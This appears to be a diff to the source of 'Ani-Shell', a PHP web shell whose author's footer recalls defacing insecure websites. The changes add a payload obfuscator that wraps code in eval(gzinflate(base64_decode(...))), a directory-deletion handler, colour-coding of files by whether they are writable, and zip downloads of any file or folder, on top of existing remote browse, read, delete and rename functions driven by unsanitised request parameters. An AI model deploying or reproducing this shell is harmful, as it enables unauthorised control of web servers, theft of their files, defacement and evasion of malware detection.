+    if ( isset($_POST['code']) &&
+               $_POST['code'] != '')
     {
-        $content = htmlspecialchars(gzinflate(base64_decode($_POST['content'])));       
+        $encoded = base64_encode(gzdeflate(trim(stripslashes($_POST['code'].' '),'<?php,?>'),9)); // high Compression! :P
+        $encode = '
+<?php
+$encoded = \''.$encoded.'\';
+eval(gzinflate(base64_decode($encoded)));
+// Script Encoded by Ani-Shell 
+?>
+';
     }
-    ?>
+    else
+    {
+        $encode = 'Please Enter your Code! and Click Submit! :)';    
+    }?>
     <form method="POST">
-     <textarea name="content" rows="20" cols="100" class="cmd"><?php echo $content;?></textarea><br />
-        <input name="save" type="Submit" value="Decode" class="own" id="spacing"/>
+        <textarea class="cmd" cols="100" rows="20" name="code"><?php echo $encode;?></textarea><br />
+        <input style="margin: 20px; margin-left: 50px; padding: 10px;"  class="own"  type="submit" value="Encode :D"/>
     </form>
+    
     <?php
 }
 
@@ -1749,6 +2279,7 @@ else if(isset($_GET['decode']))
 else if(isset($_GET['open']))
 {
     ?>
+	</center>
         <form method="POST" action="<?php echo $self;?>" >
         <table>
             <tr>
@@ -1758,7 +2289,7 @@ else if(isset($_GET['open']))
                 <td>Size </td><td> : </td><td><input value="<?php echo filesize($_GET['open']);?>" class="cmd" /></td> 
             </tr>
         </table>
-        <textarea name="content" rows="20" cols="100" class="cmd"><?php
+        <textarea name="content" rows="20" cols="60" class="cmd"><?php
         $content = htmlspecialchars(file_get_contents($_GET['open']));
         if($content)
         {
@@ -1766,10 +2297,13 @@ else if(isset($_GET['open']))
         }
         else if(function_exists('fgets') && function_exists('fopen') && function_exists('feof'))
         {
-            fopen($_GET['open']);
+            $fd = fopen($_GET['open']);
+	    if (!$fd) echo "<p class='alert_red'>Permission Denied</p>";
+	    else {
             while(!feof())
             {
-                echo htmlspecialchars(fgets($_GET['open']));
+                echo htmlspecialchars(fgets($fd));
+            }
             }
         }
 
@@ -1816,13 +2350,12 @@ else if(isset($_GET['rename']))
     <?php
     }
 }
-
-
 // No request made
 // Display home page
 
 else
 {
+    echo "    </center>";
     $dir = getcwd();
     if(isset($_GET['dir']))
     {
@@ -1831,9 +2364,9 @@ else
     ?>
     <table id="margins">
     <tr>
-        <form method="GET"  action="<?php echo $self;?>">
+        <form method="GET" action="<?php echo $self;?>">
         <td width="100">PWD</td><td width="410"><input name="dir" class="cmd" id="mainInput" value="<?php echo $dir;?>"/></td>
-        <td><input type="submit" value="G0!!" class="own" /></td>
+        <td><input type="submit" value="GO" class="own" /></td>
         </form>
     </tr>
     </table>
@@ -1845,6 +2378,7 @@ else
         <th width="100px" class="header">Permissions</th>
         <th width="100px" class="header">Delete</th>
         <th width="100px" class="header">Rename</th>
+	<th width="100px" class="header">Zip</th>
     </tr>
     <?php
     
@@ -1852,29 +2386,48 @@ else
     {
         if(unlink(($_GET['delete'])) == FALSE)
         {
-            echo "<p id='margins' style='color:red;'>Could Not Delete the file Specified!</p>";
+            echo "<p id='margins' class='alert_red'>Could Not Delete the FILE Specified</p>";
         }
     }
+
+    else if(isset($_GET['delete_dir']))
+    {
+        if(rmdir(($_GET['delete'])) == FALSE)
+        {
+            echo "<p id='margins' class='alert_red'>Could Not Delete the DIRECTORY Specified</p>";
+        }
+    }
+
     if(is_dir($dir))
     {
         $handle = opendir($dir);
         if($handle != FALSE)
         {
         if($dir[(strlen($dir)-1)] != $SEPARATOR){$dir = $dir.$SEPARATOR;}
-        while (false !== ($file = readdir($handle))) {
+        while (($file = readdir($handle)) != false) {
                 if ($file != "." && $file != "..")
-        {
-                //echo $file;
-                //f its a directory
+        	{
+		
+		$color = 'red';
+		if(is_readable($dir.$file))
+		{
+			$color = 'yellow';
+		}
+		if(is_writable($dir.$file))
+		{
+			$color = 'green';
+		}
+		
                 if(is_dir($dir.$file))
                 {
                     ?>
                     <tr>
-                    <td class='dir'><a href='<?php echo $self ?>?dir=<?php echo $dir.$file ?>'>/<?php echo $file ?></a></td>
-                    <td class='info'>DIR</td>
-                    <td class='info'>DIR</td>
-                    <td></td>
+                    <td class='dir'><a style="color: <?php echo $color?>;" href='<?php echo $self ?>?dir=<?php echo $dir.$file ?>'><b>/<?php echo $file ?></b></a></td>
+                    <td class='info'><?php echo HumanReadableFilesize(dirSize($dir.$file));?></td>
+                    <td class='info'><?php echo getFilePermissions($dir.$file);?></td>
+                    <td class="info"><a href="<?php echo $self;?>?delete_dir=<?php echo $dir.$file;?>">Delete</a></td>
                     <td class="info"><a href="<?php echo $self;?>?rename=<?php echo $dir.$file;?>">Rename</a></td>
+		    <td class="info"><a href="<?php echo $self;?>?zip=<?php echo $dir.$file;?>">Download (zip)</a></td>
                     </tr>
                 <?php
                 }
@@ -1883,11 +2436,12 @@ else
                 {
                     ?>
                     <tr>
-                    <td class='file'><a href='<?php echo $self ?>?open=<?php echo $dir.$file ?>'><?php echo $file ?></a></td>
+                    <td class='file'><a style="color: <?php echo $color?>;" href='<?php echo $self ?>?open=<?php echo $dir.$file ?>'><?php echo $file ?></a></td>
                     <td class='info'><?php echo HumanReadableFilesize(filesize($dir.$file));?></td>
                     <td class='info'><?php echo getFilePermissions($dir.$file);?></td>
                     <td class="info"><a href="<?php echo $self;?>?delete=<?php echo $dir.$file;?>">Delete</a></td>
                     <td class="info"><a href="<?php echo $self;?>?rename=<?php echo $dir.$file;?>">Rename</a></td>
+	            <td class="info"><a href="<?php echo $self;?>?zip=<?php echo $dir.$file;?>">Download (zip)</a></td>
                     </tr>
                     <?php
                 }
@@ -1898,7 +2452,7 @@ else
     }
     else
     {
-        echo "<p class='alert' id='margins'>".$_GET['dir']." is <b>NOT</b> a Valid Directory!<br /></p>";
+        echo "<p class='alert_red' id='margins'>Permission Denied</p>";
     }
     ?>
     </table>
@@ -1913,14 +2467,16 @@ else
 // End Shell
 //-------------------------------------------------------------------------------------------------
 ?>
-<br /><br /><br /><br />
+  <div class="clearfooter"></div>
+</div>
 
-<div class="end">
-<p align="center"><b>––•(-• © Copyright lionaneesh [All rights reserved] •-)•––</b><br />
+<div class="end" id='footer' style="margin-top: 20px;">
+<p align="center"><b>(C) Copyright lionaneesh [All rights reserved]</b><br />
 (: <a href="http://twitter.com/lionaneesh">Follow Me</a> | <a href="http://facebook.com/lionaneesh">Facebook</a> :) <br />
 \m/ <b>Greetz to</b> : LuCky , Aasim Bhai aKa R00tD3vil , and all ICA and Indishell Members! We'll Always rock \m/<br />
-"" ALL I REMEMBER WERE THOSE LONENY NIGHTS WHEN I WAS DEFACING THOSE INSECURE WEBSITES ""
+All I remember were those lonely nights when I was defacing those insecure websites
 </p>
 </div>
+
 </body>
 </html>
